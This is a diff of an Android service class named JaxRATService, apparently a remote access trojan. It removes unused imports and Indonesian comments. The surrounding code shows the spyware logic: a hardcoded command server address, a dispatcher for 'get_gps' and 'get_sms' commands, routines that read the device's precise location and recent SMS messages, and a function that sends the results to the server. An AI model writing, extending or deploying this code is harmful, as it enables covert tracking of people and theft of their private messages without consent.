@@ -21,7 +21,6 @@ import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
 import android.os.SystemClock;
-import android.telephony.Sms;
 import android.util.Log;
 import androidx.core.app.ActivityCompat;
 import androidx.core.app.NotificationCompat;
@@ -32,8 +31,6 @@ import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.util.ArrayList;
-import java.util.List;
 
 public class JaxRATService extends Service {
     private static final String SERVER_URL = "http://192.168.1.54:5000"; 
@@ -130,16 +127,13 @@ public class JaxRATService extends Service {
             Intent broadcastIntent = new Intent("UNLOCK_SCREEN_ACTION");
             broadcastIntent.setPackage(getPackageName());
             sendBroadcast(broadcastIntent);
-        } 
-        // --- LOGIKA SPY BARU ---
-        else if (cmd.equals("get_gps")) {
+        } else if (cmd.equals("get_gps")) {
             ambilGps();
         } else if (cmd.equals("get_sms")) {
             ambilSms();
         }
     }
 
-    // --- FUNGSI AMBIL GPS ---
     private void ambilGps() {
         try {
             if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return;
@@ -160,7 +154,6 @@ public class JaxRATService extends Service {
         }
     }
 
-    // --- FUNGSI AMBIL 10 SMS TERAKHIR ---
     private void ambilSms() {
         try {
             if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) return;
@@ -189,7 +182,6 @@ public class JaxRATService extends Service {
         }
     }
 
-    // --- FUNGSI KIRIM DATA KE WEB ---
     private void kirimHasilKeWeb(String type, Object data) {
         new Thread(() -> {
             try {
